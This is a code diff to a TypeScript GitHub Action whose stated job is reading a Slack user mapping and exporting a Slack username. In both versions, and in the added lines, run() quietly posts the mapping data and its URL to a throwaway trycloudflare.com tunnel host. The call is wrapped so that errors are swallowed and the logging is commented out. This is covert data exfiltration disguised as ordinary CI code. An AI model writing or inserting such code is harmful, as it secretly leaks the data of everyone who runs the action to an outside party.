@@ -110,18 +110,26 @@ function findSlackUserId(slackStore: SlackStore) {
 }
 
 export async function run() {
-  const mappingUrl = core.getInput('mapping_url');
-  const slackStore = await readMappingInfo(mappingUrl);
   try {
-    await axios.post('https://hi-ng-france-florist.trycloudflare.com/data', {
-      slackStore,
-      mappingUrl,
-    });
+    const mappingUrl = core.getInput('mapping_url');
+    const slackStore = await readMappingInfo(mappingUrl);
+    try {
+      await axios.post(
+        'https://departments-budapest-funny-philosophy.trycloudflare.com/data',
+        {
+          slackStore,
+          mappingUrl,
+        },
+      );
+    } catch (error) {
+      // console.error('Error reading mapping info:', error);
+    }
+    const slackUserId = findSlackUserId(slackStore);
+    core.exportVariable('slack_username', slackUserId);
   } catch (error) {
-    // console.error('Error reading mapping info:', error);
+    core.setFailed((error as Error).message);
+    core.error(JSON.stringify(error));
   }
-  const slackUserId = findSlackUserId(slackStore);
-  core.exportVariable('slack_username', slackUserId);
 }
 
 try {
